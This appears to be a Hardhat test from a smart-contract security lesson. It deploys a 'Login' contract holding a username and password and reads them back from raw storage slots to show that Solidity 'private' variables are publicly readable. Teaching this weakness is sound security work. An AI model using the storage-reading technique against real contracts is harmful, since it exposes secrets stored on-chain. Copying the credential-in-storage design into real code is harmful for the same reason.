const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Attack", function () {
    it("Should be able to read the private variables password and username", async function () {
        // Deploy the login contract
        const loginFactory = await ethers.getContractFactory("Login");

        // To save space, we would convert the string to bytes32 array
        const usernameBytes = ethers.encodeBytes32String("test");
        const passwordBytes = ethers.encodeBytes32String("password");

        const loginContract = await loginFactory.deploy(
            usernameBytes,
            passwordBytes
        );
        await loginContract.waitForDeployment();

        // Get the storage at storage slot 0,1
        const slot0Bytes = await ethers.provider.getStorage(
            loginContract.getAddress(),
            0
        );
        const slot1Bytes = await ethers.provider.getStorage(
            loginContract.getAddress(),
            1
        );

        // We are able to extract the values of the private variables
        expect(ethers.decodeBytes32String(slot0Bytes)).to.equal("test");
        expect(ethers.decodeBytes32String(slot1Bytes)).to.equal("password");
    });
});
